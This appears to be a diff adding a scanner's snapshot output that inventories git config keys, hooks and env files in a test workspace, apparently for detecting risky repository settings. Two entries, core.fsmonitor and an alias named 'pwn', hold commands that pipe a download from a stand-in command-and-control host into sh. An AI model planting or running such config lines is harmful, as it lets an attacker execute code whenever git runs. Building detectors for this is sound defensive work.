@@ -1,0 +1,31 @@
+item workspace/project:<root>/repository-metadata/.git/config#core.fsmonitor
+  shape=entry scope=project provenance=unknown activation=active registered=true symlink=false size=62
+  sha256=7da02910f55d7406de745c9428210dd561cbd79fd6ef3b11265b7972485753f5
+  view repo {commondir_outside_repo=false exec_keys=[{key="core.fsmonitor" value="curl -s https://c2.example.invalid/x | sh" value_outside_repo=false}] exec_keys_n=1 gitdir_outside_repo=false hook_executables=[""] hook_executables_n=0}
+item workspace/project:<root>/repository-metadata/.git/config#core.hooksPath
+  shape=entry scope=project provenance=unknown activation=active registered=true symlink=false size=50
+  sha256=c9a2a76e16ef1cd41d7aea62763b099e27b4557fe48fad12bd2b7ed1c542d501
+  view repo {commondir_outside_repo=false exec_keys=[{key="core.hooksPath" value="/tmp/agentsweep.invalid/hooks" value_outside_repo=true}] exec_keys_n=1 gitdir_outside_repo=false hook_executables=[""] hook_executables_n=0}
+item workspace/project:<root>/repository-metadata/.git/config#filter.lfs.process
+  shape=entry scope=project provenance=unknown activation=active registered=true symlink=false size=49
+  sha256=c0a56a2264d9f1e5a8bc73520f50cf00d89fbebafca70d587c4831440ec623d8
+  view repo {commondir_outside_repo=false exec_keys=[{key="filter.lfs.process" value="git-lfs filter-process" value_outside_repo=false}] exec_keys_n=1 gitdir_outside_repo=false hook_executables=[""] hook_executables_n=0}
+item workspace/project:<root>/repository-metadata/.git/config#alias.pwn
+  shape=entry scope=project provenance=unknown activation=active registered=true symlink=false size=58
+  sha256=a90ee25271829b9e31b4446c75f11ce86772e8e8062b86e1742c58ec94a38f18
+  view repo {commondir_outside_repo=false exec_keys=[{key="alias.pwn" value="!curl -s https://c2.example.invalid/a | sh" value_outside_repo=false}] exec_keys_n=1 gitdir_outside_repo=false hook_executables=[""] hook_executables_n=0}
+item workspace/project:<root>/repository-metadata/.git/hooks/pre-commit
+  shape=file scope=project provenance=unknown activation=active registered=true symlink=false size=90
+  sha256=0ac299fadd136906db92ceb6951999c0e32ee6e6890106b5d3c9f3e2bdbdb02c
+  view repo {commondir_outside_repo=false exec_keys=[{key="" value="" value_outside_repo=false}] exec_keys_n=0 gitdir_outside_repo=false hook_executables=["pre-commit"] hook_executables_n=1}
+item workspace/project:<root>/env-file/.env
+  shape=file scope=project provenance=manual activation=unknown registered=true symlink=false size=59
+  sha256=dc17488430e8a81ddfb98bec149fafbcc924c6288e17e1d58df3f7b2f00f3ea0
+  view env {keys=["DATABASE_URL", "CODEX_HOME"] keys_n=2}
+item workspace/project:<root>/env-file/.env.local
+  shape=file scope=project provenance=manual activation=unknown registered=true symlink=false size=64
+  sha256=acaf3e0aff17e69db38e426ce383d577a170370a5891bba5ef2aedc79454e5ac
+  view env {keys=["OPENAI_BASE_URL", "OPENAI_API_KEY"] keys_n=2}
+watch recursive <root>/.git/hooks
+watch <root>
+watch <root>/.git
